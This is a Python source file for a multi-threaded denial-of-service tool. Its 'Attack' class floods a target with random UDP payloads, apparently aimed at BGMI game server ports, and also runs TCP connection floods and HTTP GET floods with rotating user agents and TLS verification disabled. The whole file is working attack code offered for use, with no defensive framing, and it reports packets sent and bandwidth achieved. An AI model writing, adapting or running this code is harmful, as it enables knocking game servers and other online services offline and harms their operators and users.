import socket
import threading
import random
import time
import ssl
import http.client

class Attack:
    def __init__(self):
        self.on = False
        self.pkts = 0
        self.bytes_out = 0
        self.lock = threading.Lock()
        self.http_success = 0
        self.http_fail = 0
    
    def udp_flood(self, ip, port, end):
        sockets = []
        for _ in range(20):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
                s.settimeout(0.001)
                sockets.append(s)
            except:
                pass
        
        bgmi_ports = list(range(7000, 15000)) + [10335, 17500, 20000, 27000, 8080, 8443]
        payloads = [random.randbytes(random.randint(500, 1500)) for _ in range(30)]
        
        while self.on and time.time() < end:
            try:
                for s in sockets[:5]:
                    for _ in range(30):
                        if not self.on:
                            break
                        target_port = random.choice(bgmi_ports)
                        payload = random.choice(payloads)
                        try:
                            s.sendto(payload, (ip, target_port))
                            with self.lock:
                                self.pkts += 1
                                self.bytes_out += len(payload)
                        except:
                            pass
                time.sleep(0.001)
            except:
                pass
        
        for s in sockets:
            try:
                s.close()
            except:
                pass
    
    def tcp_flood(self, ip, port, end):
        while self.on and time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                try:
                    s.connect((ip, port))
                    s.send(b'GET / HTTP/1.1\r\n\r\n')
                    with self.lock:
                        self.pkts += 1
                except:
                    pass
                s.close()
                time.sleep(0.001)
            except:
                pass
    
    def http_flood(self, ip, port, end):
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36'
        ]
        
        paths = ['/', '/api', '/game', '/match', '/login', '/auth', '/player']
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        while self.on and time.time() < end:
            try:
                ua = random.choice(user_agents)
                path = random.choice(paths)
                headers = {
                    'User-Agent': ua,
                    'Accept': 'text/html,application/json,*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Connection': 'keep-alive'
                }
                
                try:
                    conn = http.client.HTTPSConnection(ip, port, context=context, timeout=1)
                    conn.request('GET', path, headers=headers)
                    conn.getresponse()
                    with self.lock:
                        self.http_success += 1
                        self.pkts += 1
                    conn.close()
                except:
                    try:
                        conn = http.client.HTTPConnection(ip, port, timeout=1)
                        conn.request('GET', path, headers=headers)
                        conn.getresponse()
                        with self.lock:
                            self.http_success += 1
                            self.pkts += 1
                        conn.close()
                    except:
                        with self.lock:
                            self.http_fail += 1
                
                time.sleep(0.001)
            except:
                pass
    
    def start(self, ip, port, dur, threads, method='mixed'):
        self.on = True
        self.pkts = 0
        self.bytes_out = 0
        self.http_success = 0
        self.http_fail = 0
        
        end = time.time() + dur
        
        udp_t = int(threads * 0.5)
        tcp_t = int(threads * 0.2)
        http_t = int(threads * 0.3)
        workers = []
        
        for _ in range(udp_t):
            workers.append(threading.Thread(target=self.udp_flood, args=(ip, port, end)))
        for _ in range(tcp_t):
            workers.append(threading.Thread(target=self.tcp_flood, args=(ip, port, end)))
        for _ in range(http_t):
            workers.append(threading.Thread(target=self.http_flood, args=(ip, port, end)))
        
        for w in workers:
            w.daemon = True
            w.start()
        
        time.sleep(dur)
        self.on = False
        
        for w in workers:
            try:
                w.join(timeout=1)
            except:
                pass
        
        e = max(dur, 0.1)
        return {
            'pkts': self.pkts,
            'mbps': (self.bytes_out * 8) / (e * 1e6),
            'http_success': self.http_success,
            'http_fail': self.http_fail,
            'total_requests': self.pkts + self.http_success + self.http_fail
        }
